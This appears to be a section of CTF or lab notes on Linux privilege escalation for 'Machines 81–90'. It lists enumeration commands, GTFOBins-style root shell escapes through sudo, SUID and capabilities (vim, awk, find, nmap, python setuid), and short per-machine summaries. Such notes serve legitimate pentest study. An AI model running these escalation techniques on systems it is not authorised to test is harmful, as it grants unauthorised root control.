## 🛡️ Privilege Escalation (Machines 81–90)

### Enumeration Techniques

```bash
sudo -l                                  # Check sudo permissions
find / -perm -4000 -type f 2>/dev/null   # Find SUID binaries
getcap -r / 2>/dev/null                  # Check for file capabilities
ps aux | grep root                       # Look for running root processes
ls -la /etc/sudoers /etc/sudoers.d/     # Check for misconfigurations
env                                      # Look for environment variables
```

### Exploitation Techniques

```bash
# Sudo Abuse (if user can run commands as root without password)
sudo /bin/bash
sudo /usr/bin/vim -c '!sh'
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/find . -exec /bin/sh \; -quit

# SUID Exploits
./nmap --interactive   # If nmap is SUID
!sh

# Capabilities
getcap /usr/bin/python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Kernel Exploits
uname -a
searchsploit linux kernel <version>
```

### Notable Escalations per Machine

- **Machine 81**: Exploited SUID binary `/usr/bin/python3` with cap_setuid+ep.
- **Machine 82**: Used `sudo` permission for `awk` to gain shell.
- **Machine 83**: Misconfigured `sudoers` file allowed direct `/bin/bash`.
- **Machine 84**: Kernel exploit for outdated version 4.15.
- **Machine 85**: Abuse of `env_keep` in sudoers for PATH hijacking.
- **Machine 86**: Found writable cronjob that executes script as root.
- **Machine 87**: Docker group membership allowed root shell inside container.
- **Machine 88**: LD_PRELOAD abuse with user-controlled library path.
- **Machine 89**: Found logrotate script writable and run by root.
- **Machine 90**: Sudo allowed editing with `vim`, used `:!bash` to escape shell.
